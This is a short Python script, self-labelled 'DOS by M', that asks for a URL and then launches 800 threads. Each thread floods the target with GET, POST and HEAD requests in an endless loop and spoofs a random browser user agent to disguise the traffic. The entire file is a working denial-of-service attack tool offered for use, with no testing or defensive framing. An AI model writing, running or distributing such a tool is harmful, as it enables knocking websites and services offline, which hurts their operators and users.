from threading import Thread
from time import sleep
import random
import requests
import fake_useragent as agent
us = agent.UserAgent()
ag = us.random
headers = {
	"User-Agent" : str(ag)
}
print("DOS by M")
sleep(2)
print("Loading...")
sleep(2)
URL = input("URL: ")
def sendpackage():
	while True:
		requests.get(URL, headers=headers)
		requests.post(URL, headers=headers)
		requests.head(URL, headers=headers)
		print("Sended + 1 package")
		
if __name__ == '__main__':
	for i in range(800):
		thr = Thread(target=sendpackage)
		thr.start()
